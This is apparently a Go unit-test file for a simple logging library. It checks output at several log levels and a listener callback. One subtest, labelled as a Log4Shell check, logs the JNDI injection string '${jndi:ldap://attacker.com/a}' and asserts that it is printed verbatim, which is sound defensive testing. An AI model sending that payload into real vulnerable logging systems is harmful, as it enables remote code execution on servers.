package logger_test

import (
	"bufio"
	"os"
	"strings"
	"testing"

	"github.com/pauloo27/logger"
	"github.com/stretchr/testify/assert"
)

type testLogLevel struct {
	Level    logger.Level
	LogFunc  func(...interface{})
	LogfFunc func(string, ...interface{})
}

func logToReader(t *testing.T) *bufio.Reader {
	// change the stdout to something we can manage
	r, w, err := os.Pipe()

	assert.Nil(t, err)
	assert.NotNil(t, r)
	assert.NotNil(t, w)

	logger.Stdout = w

	// create a reader to read the logged lines
	return bufio.NewReader(r)
}

func assertLog(t *testing.T, reader *bufio.Reader, expected string) {
	line, err := reader.ReadString('\n')
	assert.Nil(t, err)
	// trim the [LEVEL @ hh:mm:ss] prefix
	// (by splitting by spaces, I guess thats not really good tho)
	// and the \n suffix
	line = strings.TrimSuffix(strings.Join(strings.Split(line, " ")[3:], " "), "\n")
	assert.Equal(t, expected, line)
}

func TestLogger(t *testing.T) {
	reader := logToReader(t)

	defaultLevelsFunc := []testLogLevel{
		{Level: logger.DEBUG, LogFunc: logger.Debug, LogfFunc: logger.Debugf},
		{Level: logger.SUCCESS, LogFunc: logger.Success, LogfFunc: logger.Successf},
		{Level: logger.INFO, LogFunc: logger.Info, LogfFunc: logger.Infof},
		{Level: logger.WARN, LogFunc: logger.Warn, LogfFunc: logger.Warnf},
	}

	testLogDefaultLevels := func(expected string, params ...interface{}) {
		for _, level := range defaultLevelsFunc {
			level.LogFunc(params...)
			assertLog(t, reader, expected)
		}
	}

	testLogfDefaultLevels := func(expected string, format string, params ...interface{}) {
		for _, level := range defaultLevelsFunc {
			level.LogfFunc(format, params...)
			assertLog(t, reader, expected)
		}
	}

	t.Run("log 'hello' in all non-error levels", func(t *testing.T) {
		testLogDefaultLevels("hello", "hello")
	})

	t.Run("log '10' in all non-error levels", func(t *testing.T) {
		testLogDefaultLevels("10", 10)
	})

	t.Run("logf 'hi steve'", func(t *testing.T) {
		testLogfDefaultLevels("hi steve", "hi %s", "steve")
	})

	t.Run("logf 'hi im steve and my favorite number is -127'", func(t *testing.T) {
		testLogfDefaultLevels(
			"hi im steve and my favorite number is -127",
			"hi im %s and my favorite number is %d", "steve", -127,
		)
	})

	t.Run("log 'nice 10'", func(t *testing.T) {
		testLogDefaultLevels("nice 10", "nice", 10)
	})

	t.Run("log 'nice true 10'", func(t *testing.T) {
		testLogDefaultLevels("nice true 10", "nice", true, 10)
	})

	// test log4shell
	t.Run("should not allow RCE", func(t *testing.T) {
		testLogDefaultLevels("${jndi:ldap://attacker.com/a}", "${jndi:ldap://attacker.com/a}")
	})

	// TODO: custom level
	// TODO: error/fatal
}

func TestListener(t *testing.T) {
	reader := logToReader(t)
	ch := make(chan logger.Level, 1)

	logger.AddLogListener(func(level logger.Level, params ...interface{}) {
		ch <- level
	})

	logger.Info("Ednaldo Pereira")
	assertLog(t, reader, "Ednaldo Pereira")
	level := <-ch
	assert.Equal(t, logger.INFO, level)
}
